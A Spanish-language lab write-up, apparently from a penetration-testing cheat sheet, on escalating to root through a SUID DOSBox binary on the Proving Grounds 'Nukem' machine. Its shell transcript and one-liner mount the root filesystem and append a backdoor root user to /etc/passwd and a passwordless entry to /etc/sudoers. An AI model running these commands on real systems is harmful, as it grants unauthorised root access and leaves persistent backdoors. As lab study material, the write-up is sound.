## DESCRIPTION

Dos box nos permite montar un directorio, en este caso como root. O bien escribir en un fichero como root tambien.


#### Mas información
* https://kashz.gitbook.io/proving-grounds-writeups/pg-boxes/nukem/5-privesc-dosbox
* https://gtfobins.github.io/gtfobins/dosbox/


## EXPLOITATION

ENUMERAMOS Y ENCONTRAMOS QUE TIENE EL BINARIO DOSBOX CON SUID, tambien vale para sudo

### OPTION 1: DESDE INTERFAZ DE DOSBOX

Si hemos ganado acceso usando vnc o alguno de estos lo podemos usar:

```
# running /usr/bin/dosbox

# opens a dosbox cmd prompt

# looks like windows

Using https://linux.die.net/man/1/dosbox

# searching for suid /usr/bin/dosbox > https://github.com/liwuqi/huck-box/blob/master/my_notes

# we can mount file system using MOUNT <drive> <path>

Z:\> MOUNT k /

Mounting / is NOT recommended. Please mount a (sub)directory next time.

Drive k is mounted as local directory /.

Z:\> k:

# we are now under / filesystem

# can read /root/proof.txt flag but we need interactive shell

# changing /etc/passwd

K:\> echo 'kashz:cAZZtf3ncxRAY:0:0:root:/root:/bin/bash' >> /etc/passwd

[commander@nukem ~]$ su kashz

Password:

Warning: your password will expire in 32558 days.

: No such file or directorybash

# not working

# lets add commander to sudoers

K:\> echo commander ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers

# via ssh shell

[commander@nukem ~]$ sudo su

[root@nukem commander]# whoami;id;hostname

root

uid=0(root) gid=0(root) groups=0(root)

nukem
```

### OPTION 2: DESDE UNA CMD

```
./dosbox -c 'mount c /' -c "echo DATA >c:$LFILE" -c exit
```

Muy util para escribir en /etc/passwd un usuario o en sudoers como en el anterior pero oneliner


## MACHINES

* Hack The Box: 
* PG: Nukem

**!!NOTA IMPORTANTE!!** 